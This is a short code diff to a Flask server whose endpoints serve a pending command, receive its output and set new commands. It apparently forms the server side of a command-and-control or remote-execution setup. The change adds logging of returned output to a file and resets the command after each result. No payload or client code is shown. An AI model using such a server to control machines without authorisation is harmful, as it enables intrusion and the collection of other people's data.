@@ -3,6 +3,7 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 current_command = ""
+output_log_file = "./command_output.log"
 
 @app.route('/command', methods=['GET'])
 def get_command():
@@ -13,8 +14,12 @@ def get_command():
 @app.route('/result', methods=['POST'])
 def post_result():
     """ print command output """
+    global current_command
     output = request.form.get("output", "")
     print(f"COMMAND OUTPUT:\n{output}")
+    with open(output_log_file, "a") as log_file:
+        log_file.write(f"COMMAND OUTPUT:\n{output}\n\n")
+    current_command = ""
     return "OK"
 
 @app.route('/set_command', methods=['POST'])
